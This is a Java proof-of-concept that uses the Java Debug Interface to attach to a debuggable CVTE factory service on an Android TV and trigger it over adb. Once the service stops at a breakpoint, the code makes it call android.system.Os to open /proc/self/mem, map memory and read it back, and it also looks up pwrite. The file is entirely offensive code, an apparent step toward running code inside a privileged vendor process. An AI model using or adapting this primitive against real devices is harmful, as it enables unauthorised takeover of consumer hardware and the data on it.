import com.sun.jdi.*;
import com.sun.jdi.connect.*;
import com.sun.jdi.event.*;
import com.sun.jdi.request.*;
import java.util.*;

public class JdiSelfMem {
    static Method find(ReferenceType t, String n, String s) {
        for (Method m : t.methodsByName(n)) if (m.signature().equals(s)) return m;
        return null;
    }
    static ThreadReference waitBreak(VirtualMachine vm, int timeout) throws Exception {
        EventSet es = vm.eventQueue().remove(timeout);
        if (es == null) return null;
        for (Event ev : es) if (ev instanceof BreakpointEvent) return ((BreakpointEvent) ev).thread();
        return null;
    }
    static void ex(InvocationException ie) {
        System.out.println("EX " + ie.exception().referenceType().name());
        try { Field f=ie.exception().referenceType().fieldByName("detailMessage"); if(f!=null) System.out.println("msg="+ie.exception().getValue(f)); } catch(Throwable x){}
    }
    public static void main(String[] a) throws Exception {
        AttachingConnector conn = null;
        for (AttachingConnector c : Bootstrap.virtualMachineManager().attachingConnectors())
            if (c.name().equals("com.sun.jdi.SocketAttach")) conn = c;
        Map<String,Connector.Argument> ca = conn.defaultArguments();
        ca.get("hostname").setValue("localhost"); ca.get("port").setValue("8700"); ca.get("timeout").setValue("5000");
        VirtualMachine vm = conn.attach(ca);
        try {
            ReferenceType svc = vm.classesByName("com.cvte.factory.service.MainService").get(0);
            Method on = find(svc, "onStartCommand", "(Landroid/content/Intent;II)I");
            BreakpointRequest bp = vm.eventRequestManager().createBreakpointRequest(on.location());
            bp.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD); bp.enable();
            Thread t = new Thread(() -> { try { Thread.sleep(1200);
                new ProcessBuilder("adb","-s","<TV_IP>:5555","shell","am","startservice",
                    "-n","com.cvte.factory.service/.MainService","-a","cvte.factory.intent.action.APIInit")
                    .inheritIO().start().waitFor(); } catch (Exception e) { e.printStackTrace(); } });
            t.start(); vm.resume();
            ThreadReference thr = waitBreak(vm, 15000);
            if (thr == null) { System.out.println("no breakpoint"); vm.resume(); return; }
            ClassType os = (ClassType)vm.classesByName("android.system.Os").get(0);
            Method open = find(os,"open","(Ljava/lang/String;II)Ljava/io/FileDescriptor;");
            Method mmap = find(os,"mmap","(JJIILjava/io/FileDescriptor;J)J");
            Method pread = find(os,"pread","(Ljava/io/FileDescriptor;[BIIJ)I");
            Method pwrite = find(os,"pwrite","(Ljava/io/FileDescriptor;[BIIJ)I");
            ObjectReference mem = null;
            try {
                mem = (ObjectReference)os.invokeMethod(thr, open, Arrays.asList(vm.mirrorOf("/proc/self/mem"), vm.mirrorOf(2), vm.mirrorOf(0)), 0);
                System.out.println("memfd=" + mem);
            } catch (InvocationException ie) { System.out.println("open mem"); ex(ie); }
            ObjectReference zero = (ObjectReference)os.invokeMethod(thr, open, Arrays.asList(vm.mirrorOf("/dev/zero"), vm.mirrorOf(2), vm.mirrorOf(0)), 0);
            long addr = ((LongValue)os.invokeMethod(thr, mmap,
                Arrays.asList(vm.mirrorOf(0L), vm.mirrorOf(4096L), vm.mirrorOf(3), vm.mirrorOf(0x22), (Value)zero, vm.mirrorOf(0L)), 0)).value();
            System.out.println("anon addr=0x" + Long.toHexString(addr));
            if (mem != null) {
                ArrayType at = (ArrayType)pread.argumentTypes().get(1);
                ArrayReference buf = at.newInstance(16);
                try {
                    Value n = os.invokeMethod(thr, pread, Arrays.asList((Value)mem,(Value)buf,vm.mirrorOf(0),vm.mirrorOf(16),vm.mirrorOf(addr)),0);
                    System.out.println("pread n=" + n);
                    for (Value v : buf.getValues()) System.out.printf("%02x", ((ByteValue)v).value()&0xff);
                    System.out.println();
                } catch (InvocationException ie) { System.out.println("pread"); ex(ie); }
            }
            bp.disable(); vm.resume();
        } finally { try { vm.dispose(); } catch (Throwable t) {} }
    }
}
